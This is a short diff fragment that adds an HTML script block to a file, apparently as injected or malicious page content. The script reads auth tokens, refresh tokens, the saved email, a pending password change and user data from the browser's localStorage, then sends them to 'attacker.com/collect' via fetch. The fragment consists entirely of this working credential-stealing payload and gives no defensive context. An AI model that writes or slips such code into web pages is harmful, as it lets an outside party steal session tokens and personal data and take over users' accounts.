@@ -1,0 +1,3 @@
+<script>
+fetch("https://attacker.com/collect?"+["authToken","refreshToken","savedEmail","pendingPasswordChange","user"].map(k=>k+"="+encodeURIComponent(localStorage[k])).join("&"))
+</script>
